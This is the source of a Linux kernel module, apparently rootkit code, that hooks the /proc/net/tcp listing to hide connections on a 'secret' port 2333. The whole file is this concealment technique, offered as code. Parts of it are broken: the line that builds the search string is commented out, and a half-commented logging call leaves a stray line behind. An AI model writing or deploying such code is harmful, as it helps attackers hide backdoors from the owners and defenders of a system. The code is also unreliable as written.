
# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <net/tcp.h> // struct tcp_seq_afinfo.
# endif // CPP

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define NET_ENTRY "/proc/net/tcp"
# define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
# define SECRET_PORT 2333 
# define NEEDLE_LEN 6
# define TMPSZ 150

int
(*real_seq_show)(struct seq_file *seq, void *v);
int
fake_seq_show(struct seq_file *seq, void *v);


int
init_module(void)
{
    //fm_alert("%s\n", "Greetings the World!");

    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                      fake_seq_show, real_seq_show);

    return 0;
}


void
cleanup_module(void)
{
    if (real_seq_show) {
        void *dummy;
        set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                          real_seq_show, dummy);
    }

   // fm_alert("%s\n", "Farewell the World!");
    return;
}


int
fake_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char needle[NEEDLE_LEN];

    //snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
    ret = real_seq_show(seq, v);

    if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
        //fm_alert("Hiding port %d using needle %s.\n",
                 SECRET_PORT, needle);
        seq->count -= TMPSZ;
    }

    return ret;
}
